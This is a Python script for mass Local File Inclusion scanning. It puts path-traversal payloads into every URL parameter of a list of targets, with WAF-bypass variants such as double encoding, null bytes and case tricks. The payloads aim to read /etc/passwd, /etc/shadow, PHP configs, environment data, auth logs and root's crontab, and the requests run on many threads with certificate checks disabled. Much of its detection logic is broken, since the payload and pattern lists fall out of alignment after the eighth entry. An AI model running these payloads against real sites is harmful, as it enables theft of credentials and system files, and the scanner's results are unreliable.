#!/usr/bin/env python3

import requests
import argparse
import logging
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings to prevent console clutter when scanning HTTPS URLs with self-signed certificates
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Setup logging to capture detailed scan information and errors
logging.basicConfig(
    filename='lfi_scanner.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Hardcoded payloads for LFI testing
PAYLOADS = [
    # Standard payloads
    "../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../etc/hosts",
    "../../../../../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../../../../../var/www/html/config.php",
    "../../../../../../../../../../../../proc/self/environ",
    "../../../../../../../../../../../../windows/win.ini",
    "../../../../../../../../../../../../boot.ini",
    "../../../../../../../../../../../../../../../../../../../../etc/shadow",
    
    # WAF bypass techniques
    # Double URL encoding
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",  # /etc/passwd (double-encoded)
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow",  # /etc/shadow (double-encoded)
    
    # Null byte injection
    "../../../../../../../../../../../../etc/passwd%00",    # /etc/passwd with null byte
    "../../../../../../../../../../../../var/www/html/config.php%00",  # /var/www/html/config.php with null byte
    
    # Path obfuscation
    "..../..//..../..//..../..//..../..//etc/passwd",  # Path traversal with truncation
    "..../..//..../..//..../..//..../..//etc/shadow",  # Path traversal with truncation
    
    # Case variation
    "../../../../../../../../../../../../eTc/PaSsWd",        # /etc/passwd (case variation)
    "../../../../../../../../../../../../Etc/HoStS",         # /etc/hosts (case variation)
    
    # Hexadecimal encoding (ASCII to hex for '/etc/passwd')
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",  # /etc/passwd (hex-encoded)
    
    # NGINX/Apache log files
    "../../../../../../../../../../../../var/log/nginx/access.log",
    "../../../../../../../../../../../../var/log/nginx/error.log",
    
    # Security logs and SSH config
    "../../../../../../../../../../../../var/log/auth.log",
    "../../../../../../../../../../../../etc/ssh/sshd_config",
    
    # Apache2 config
    "../../../../../../../../../../../../etc/apache2/apache2.conf",
    "../../../../../../../../../../../../etc/nginx/nginx.conf",
    
    # Root crontab
    "../../../../../../../../../../../../var/spool/cron/crontabs/root",
]


# Corresponding regex patterns for each payload to identify successful LFI
# Using raw strings (r'') to ensure backslashes are handled correctly
KEYWORDS = [
    r"root:x",                                     # /etc/passwd
    r"127\.0\.0\.1",                               # /etc/hosts
    r"GET",                                        # Apache access log
    r"(<\?php){2,}",                               # config.php (multiple "<?php")
    r"HTTP_USER_AGENT",                            # /proc/self/environ
    r"\[fonts\]",                                  # windows/win.ini
    r"Windows",                                    # boot.ini
    r"root:\*:\d+:\d+:",                           # /etc/shadow (e.g., root:*:0:0)
    r"Ubuntu",                                     # /etc/issue
    r"PATH=",                                      # /etc/profile
    r"ubuntu",                                     # /etc/hostname
    r"Welcome",                                    # /etc/motd
    r"tcp",                                        # /etc/services
    r"root:x:",                                    # /etc/group
    r"nameserver",                                 # /etc/resolv.conf
    r"/usr/local/bin",                             # /etc/rc.local
    r"net\.ipv4",                                  # /etc/sysctl.conf
    r"/dev/sda",                                   # /etc/fstab
    r"\*:\*:\*:\*:\*:",                             # /etc/crontab
    r"soft nofile",                                # /etc/security/limits.conf
    r"APP_ENV",                                    # .env
    r"DB_PASSWORD",                                # wp-config.php
    r"RewriteEngine",                              # .htaccess
    r"\[core\]",                                   # .git/config
    r"<!DOCTYPE html>",                            # index.html
    r"MAILTO=",                                    # Root crontab
    r"Accepted",                                   # Linux auth log
    r"sshd",                                       # SSH config
    r"Port \d+",                                   # SSH config (e.g., Port 22)
    r"User",                                       # Apache2 config (Apache user directive)
    r"worker_connections",                         # NGINX config (worker_connections directive)
]


def read_urls(file_path):
    """
    Read URLs from the input file.
    Each URL should be on a separate line.
    """
    try:
        with open(file_path, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        logging.info(f"Loaded {len(urls)} URLs from {file_path}")
        return urls
    except Exception as e:
        logging.error(f"Failed to read URLs from {file_path}: {e}")
        return []

def identify_parameters(url):
    """
    Parse the URL and extract query parameters.
    Returns the base URL and parameters as a dictionary.
    """
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    # Flatten the parameters: parse_qs returns list values
    params = {k: v[0] for k, v in params.items()}
    base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
    logging.debug(f"Identified parameters for URL {url}: {params}")
    return base_url, params

def construct_url(base_url, params):
    """
    Construct URL with updated parameters.
    """
    query = urlencode(params)
    return f"{base_url}?{query}"

def send_request(url):
    """
    Send an HTTP GET request to the specified URL.
    Returns the response object if successful, else None.
    """
    try:
        response = requests.get(url, timeout=10, verify=False, allow_redirects=True)
        logging.debug(f"Received response for URL {url} with status code {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed for URL {url}: {e}")
        return None

def analyze_response(response, keyword_pattern):
    """
    Analyze the HTTP response for the presence of the keyword using regex.
    Returns True if the pattern matches, False otherwise.
    """
    if response and response.status_code == 200:
        try:
            if re.search(keyword_pattern, response.text, re.IGNORECASE):
                logging.debug(f"Keyword pattern '{keyword_pattern}' matched.")
                return True
        except re.error as regex_error:
            logging.error(f"Invalid regex pattern: {keyword_pattern} | Error: {regex_error}")
    return False

def process_url(url, progress_bar):
    """
    Process a single URL by injecting payloads into its parameters and analyzing responses.
    Returns a list of tuples with vulnerable URLs and the payload that triggered the vulnerability.
    """
    vulnerable = []
    base_url, params = identify_parameters(url)
    
    if not params:
        logging.info(f"No parameters found in URL: {url}")
        progress_bar.update(1)
        return vulnerable
    
    for idx, payload in enumerate(PAYLOADS):
        # Ensure we have a corresponding keyword
        if idx >= len(KEYWORDS):
            logging.warning(f"No keyword defined for payload: {payload}. Skipping.")
            continue
        keyword_pattern = KEYWORDS[idx]
        injected_params = params.copy()
        
        # Inject payload into each parameter
        for key in injected_params:
            injected_params[key] = payload
        
        injected_url = construct_url(base_url, injected_params)
        logging.info(f"Testing payload: {payload} on URL: {injected_url}")
        response = send_request(injected_url)
        
        if analyze_response(response, keyword_pattern):
            logging.info(f"VULNERABLE: {injected_url} | Payload: {payload}")
            vulnerable.append((injected_url, payload))
            print(f"{Fore.GREEN}[+] Vulnerable: {injected_url} | Payload: {payload}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Not Vulnerable: {injected_url} | Payload: {payload}{Style.RESET_ALL}")
        
    progress_bar.update(1)
    return vulnerable

def main():
    # Argument parsing
    parser = argparse.ArgumentParser(description='Automated LFI Scanner with Regex Matching, Progress Bar, and Colored Output')
    parser.add_argument('-i', '--input', required=True, help='Input file with URLs (one per line)')
    parser.add_argument('-o', '--output', required=True, help='Output file for vulnerable URLs')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of concurrent threads (default: 10)')
    args = parser.parse_args()
    
    # Read URLs from input file
    urls = read_urls(args.input)
    if not urls:
        print("No URLs to process. Please check the input file.")
        return
    
    # Open output file for writing vulnerable URLs
    try:
        output_file = open(args.output, 'w')
        logging.info(f"Opened output file: {args.output}")
    except Exception as e:
        logging.error(f"Failed to open output file {args.output}: {e}")
        print(f"Failed to open output file {args.output}. Check log for details.")
        return
    
    # Initialize progress bar
    progress_bar = tqdm(total=len(urls), desc="Scanning URLs", unit="URL")
    
    # Start scanning with ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        # Submit all URLs to the executor
        futures = [executor.submit(process_url, url, progress_bar) for url in urls]
        
        for future in as_completed(futures):
            try:
                vulnerable = future.result()
                if vulnerable:
                    for vuln_url, payload in vulnerable:
                        output_file.write(f"{vuln_url} | Payload: {payload}\n")
            except Exception as e:
                logging.error(f"Error processing a URL: {e}")
                print(f"{Fore.RED}Error processing a URL. Check log for details.{Style.RESET_ALL}")
    
    progress_bar.close()
    output_file.close()
    print(f"\nScan complete. Results saved to {args.output}")
    logging.info("Scanning completed.")

if __name__ == "__main__":
        main()
